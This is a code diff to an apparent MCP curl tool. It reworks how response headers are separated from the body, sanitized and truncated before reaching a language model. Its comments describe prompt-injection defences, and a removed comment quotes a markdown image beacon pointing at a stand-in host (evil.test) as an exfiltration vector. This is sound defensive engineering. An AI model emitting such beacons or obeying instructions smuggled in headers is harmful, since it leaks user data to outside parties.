@@ -7,7 +7,7 @@ import { TEMP_DIR, LIMITS } from "../config/index.js";
 import { generateMetadataSeparator } from "../types/index.js";
 import { resolveOutputDir, validateOutputDir } from "../files/index.js";
 import { validateUrlAndResolveDns, checkRateLimits } from "../security/index.js";
-import { getErrorMessage, safeHostname } from "../utils/index.js";
+import { getErrorMessage, safeHostname, MARKDOWN_MIME } from "../utils/index.js";
 import { executeCommand, buildCurlArgs } from "../execution/index.js";
 import {
     parseResponseWithMetadata,
@@ -57,10 +57,12 @@ Args:
   - basic_auth (string): Basic auth as "username:password"
   - bearer_token (string): Bearer token for Authorization header
   - verbose (boolean): Include verbose request/response details
-  - include_headers (boolean): Report response headers alongside the body, under a
-    separate "headers" key. Headers are kept out of the body, so this combines safely
-    with jq_filter and save_to_file (the saved file holds the body only). Header text
-    is truncated at 64KB with a visible marker
+  - include_headers (boolean): Report response headers. With include_metadata they
+    arrive under a separate "headers" key; without it they are prefixed to the returned
+    text followed by a blank line, so that result is NOT JSON-parseable. On both
+    branches headers never reach the saved file and never reach jq_filter, which is
+    what makes this safe to combine with save_to_file and jq_filter. Header text is
+    capped at 64KB; truncation is reported via headers_truncated
   - compressed (boolean): Request compressed response (default: true)
   - include_metadata (boolean): Wrap response in JSON with metadata
   - jq_filter (string): JSON path filter to extract specific data
@@ -174,53 +176,50 @@ export async function executeCurlRequest(
         const timeoutMs = (params.timeout ?? LIMITS.DEFAULT_TIMEOUT_MS / 1000) * 1000;
         const result = await executeCommand("curl", args, timeoutMs);
 
-        // Parse response using the same unique separator
-        const { body: rawBody, contentType, headerBytes } = parseResponseWithMetadata(
-            result.stdout,
-            metadataSeparator
-        );
+        let headerTruncated = false;
+        let headerBytesReceived: number | undefined;
 
-        // `include_headers` (cURL `-i`) prepends the header block to the body on
-        // stdout. Split it back off before anything touches the body: glued
-        // together, the header text corrupted every body-shaped operation —
-        // `save_to_file` wrote a file that was no longer the JSON it claimed to
-        // be, and `jq_filter` had to be refused outright.
-        //
-        // The split point comes from cURL's own `%{size_header}`, never from
-        // scanning the bytes — see `splitResponseHeaders` for why inferring it
-        // cannot work.
+        // Parse response using the same unique separator. Byte-exact: the
+        // header boundary below is a WIRE byte count, and `result.stdout` is a
+        // lossy UTF-8 view of those bytes.
+        const parsed = parseResponseWithMetadata(result.stdoutBytes, metadataSeparator);
+        const { contentType, headerBytes, metadataFound } = parsed;
+
+        // `-i` prepends the header block to the body on stdout. Split it off
+        // before anything touches the body, at the offset cURL reported.
         let responseHeaders: string | undefined;
-        let body = rawBody;
+        let headersUndetermined = false;
+        let body = parsed.body;
         if (params.include_headers) {
-            const split = splitResponseHeaders(rawBody, headerBytes);
+            const split = splitResponseHeaders(parsed.bodyBytes, headerBytes);
             body = split.body;
+            headersUndetermined = split.headerText === undefined;
             if (split.headerText) {
-                // Header text is remote-origin text bound for the LLM, so it
-                // takes the SAME pipeline as the body — not a shorter one.
-                // `sanitizeAndDetect` alone was Step 2 only: it left markdown
-                // beacons, <script>/<style> blocks and numeric-entity-masked
-                // injections intact in the header channel after they had been
-                // stripped from the body for years.
-                //
-                // Header text is declared `text/markdown` — the strictest
-                // grammar, not the body's content-type and not `text/plain`.
-                //
-                // The body's type is the wrong question: it describes the
-                // BODY. And `text/plain` would be worse than wrong, because
-                // it turns off `stripMarkdownBeacons` — which is the stage
-                // that removes `![x](https://evil.test/?d=…)`, the exact
-                // exfiltration vector this channel carries. Header values are
-                // rendered by whatever the MCP client renders, so the only
-                // safe assumption is that markdown is live in them. Declaring
-                // the strictest grammar runs every strip stage; over-stripping
-                // a header value costs nothing, under-stripping one is the bug.
-                //
-                // Already capped to LIMITS.MAX_HEADER_TEXT_BYTES by the split,
-                // so this pipeline runs on bounded input.
-                responseHeaders = defendText(split.headerText, {
-                    contentType: "text/markdown",
+                // Same pipeline as the body, not a shorter one (invariant 1a).
+                // Markdown = the strictest grammar, so every strip stage runs.
+                // `decodeEntities: false` because that stage is ADDITIVE and its
+                // result is returned: decoding a header would hand the model a
+                // live instruction the origin only ever sent as inert text.
+                const defended = defendText(split.headerText, {
+                    contentType: MARKDOWN_MIME,
                     hostname: safeHostname(params.url),
+                    decodeEntities: false,
                 });
+                // Re-cap AFTER defence: `[link removed]` is longer than some of
+                // the forms it replaces, so capping only before it lets the
+                // documented ceiling be exceeded. Also honour the caller's
+                // inline budget — this text is returned inline even when the
+                // body went to a file, so `max_result_size` never bounded it.
+                const inlineCeiling = Math.min(
+                    LIMITS.MAX_HEADER_TEXT_BYTES,
+                    params.max_result_size ?? LIMITS.DEFAULT_MAX_RESULT_SIZE
+                );
+                responseHeaders = Buffer.byteLength(defended, "utf8") > inlineCeiling
+                    ? Buffer.from(defended, "utf8").subarray(0, inlineCeiling).toString("utf8")
+                    : defended;
+                headerTruncated = split.truncated === true
+                    || Buffer.byteLength(defended, "utf8") > inlineCeiling;
+                headerBytesReceived = split.headerBytesReceived;
             }
         }
 
@@ -231,6 +230,7 @@ export async function executeCurlRequest(
             maxResultSize: params.max_result_size,
             saveToFile: params.save_to_file,
             contentType,
+            contentTypeUndetermined: !metadataFound,
             outputDir: validatedOutputDir,
         });
 
@@ -244,7 +244,16 @@ export async function executeCurlRequest(
                 filepath: processed.savedToFile ? processed.filepath : undefined,
                 message: processed.message,
             },
-            responseHeaders
+            responseHeaders,
+            {
+                truncated: headerTruncated,
+                bytesReceived: headerBytesReceived,
+                // The caller asked for headers and provably did not get them.
+                // Reporting it is the point: silence is what made the pre-fix
+                // corruption invisible, because the degraded path returned bytes
+                // indistinguishable from the success path.
+                undetermined: params.include_headers && headersUndetermined,
+            }
         );
 
         return {
